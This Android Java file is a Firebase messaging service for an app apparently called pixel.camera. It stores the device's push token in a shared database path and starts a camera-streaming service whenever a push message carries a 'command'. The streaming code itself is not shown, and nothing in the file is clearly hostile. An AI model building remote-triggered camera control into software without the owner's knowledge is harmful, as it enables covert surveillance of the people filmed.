package com.pixel.camera;

import android.content.Intent;
import android.os.Build;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

public class FCMService extends FirebaseMessagingService {

    @Override
    public void onNewToken(String token) {
        super.onNewToken(token);
        FirebaseDatabase.getInstance()
            .getReference("token")
            .setValue(token);
    }

    @Override
    public void onMessageReceived(RemoteMessage message) {
        String command = message.getData().get("command");
        if (command == null) return;

        Intent intent = new Intent(this, CameraStreamService.class);
        intent.putExtra("command", command);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }
}
